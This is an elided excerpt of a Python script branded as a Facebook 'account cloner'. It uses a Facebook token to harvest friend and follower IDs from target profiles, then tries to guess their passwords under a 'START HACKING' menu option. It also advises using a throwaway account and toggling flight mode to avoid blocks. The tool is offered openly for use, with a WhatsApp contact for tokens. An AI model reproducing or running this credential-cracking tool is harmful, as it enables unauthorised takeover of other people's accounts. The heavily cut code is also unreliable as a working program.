...
"""%s
 ...
 - author      : Romi Afrizal
 - facebook    : facebook.com/Karma428
...
\x1b[1;96m██   ██ ██   ██ ██   ██ ██      ██ ██   ██ 
\x1b[1;96m                                             
[\033[41;1m KARMA DAVID ACCOUNT CLONER \033[00;1m\033[37;1m ]\n \033[32;1mCreator \033[37;1m: \033[33;1m KARMA DAVID\n\033[32;1m Version \033[37;1m: \033[33;1m 44.25\n\033[32;1m Whatsapp \033[37;1m: \033[33;1m+2348110044418\n\033[37;1m[\033[41;1m ITS NOT JUST A TOOL ITS A BRAND\033[00;1m\033[37;1m ]\n """%(N))
"""
...
def masuk():
    ...
    print ('\n%s [01] LOGIN USING TOKEN \n [02] GET TOKEN \n [%s00%s] LOG OUT'%(P,M,P))
    rom = raw_input('\n%s [?] MENU : %s'%(P,K))
    if rom in(""):
    	print("%s [!] CORRECT "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] Mandatory to use sacrificial account prohibited main account"%(P,M,P))
    	romz = raw_input('%s [?] TOKEN : %s'%(P,K))
        if romz in(""):
        	print("%s [!] The correct content is"%(M));exit()
    	try:
        	...
        	print("%s [!] TOKEN ERROR "%(M));masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s HERE IS HOW :"%(H,til));jeda(2)
        print (" - KINDLY CONTACT ADMIN");jeda(2)
        print (" - https://wa.me/+2348110044418"%(O,H));jeda(2)
        print (" - KARMA DAVID"%(O,H));jeda(2)
        print (" - KARMA DAVID"%(O));jeda(2)
        ...
        if nanya in(""):
        	print ("%s [!] I asked a question that must be answered"%(M));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s [√] congrats you pintar :* "%(H));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s [!] you are so stupid "%(M));jeda(2);os.system("xdg-open https://wa.me/+2348110044418");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
...
def publik(romz,headers=header):
    ...
    try:
        ...
        for a in z['friends']['data']:
            ...
            print '\r%s [*] COLLECTED ID :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] SUCCESS DUMP ID FROM %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] FIle DUMP FROM:%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
...
def followers(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] TYPE '%sme%s'IF YOU WANT TO DUMP FROM YOUR OWN FOLLOWERS  "%(P,M,P,H,P))
        idt = raw_input(' [*] TARGET ID : %s'%(K))
...
class ngentod:
    ...
    def romiy(self):
        ...
        unikers = raw_input('%s [?] Choose t For Default And Y For Manual? [y/t] :%s '%(P,K))
        if unikers in ('Y', 'y'):
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '%s [%s!%s] Put Phone 2 sec On Flight Mode When No Results\n'%(P,M,P);jeda(0.2)
...
def uas():
    ...
    if u == '':
    	...
    	print (" [%s*%s] Type %sdefault%s to Use Default User Agent Tool"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!] You will be redirected to the browser  "%(H));jeda(2)
                ...
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] using default user agent"%(H));jeda(2);menu()
...
def menu():
    ...
    try:
        ...
        print("%s [!] Token Error "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    print ('\n %s[ WELCOME %s%s%s ] \n'%(P,K,nama,P))
    print (' [%s01%s] DOWNLOAD FROM PUBLIC ID'%(K,P)) 
    print (' [%s02%s] DOWNLOAD FROM FOLLOWERS ID'%(K,P)) 
    print (' [%s03%s] DOWNLOAD FROM POSR REACTION'%(K,P))
    print (' [%s04%s] CRACK INSTAGRAM (MAINTENANCE MODE) '%(K,P))
    print (' [%s05%s] %sSTART HACKING %s'%(K,P,H,P)) 
    print (' [%s06%s] USER AGENT SETTINGS'%(K,P)) 
    print (' [%s07%s] CHECK CRACK RESULTS'%(K,P)) 
    #print (' [%s08%s] GROUP JOIN'%(K,P))
    #print (' [%s09%s] SCRIPT INFO'%(K,P))
    print (' [%s00%s] LOG OUT TOKEN '%(M,P))
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    elif unik in['1','01']:
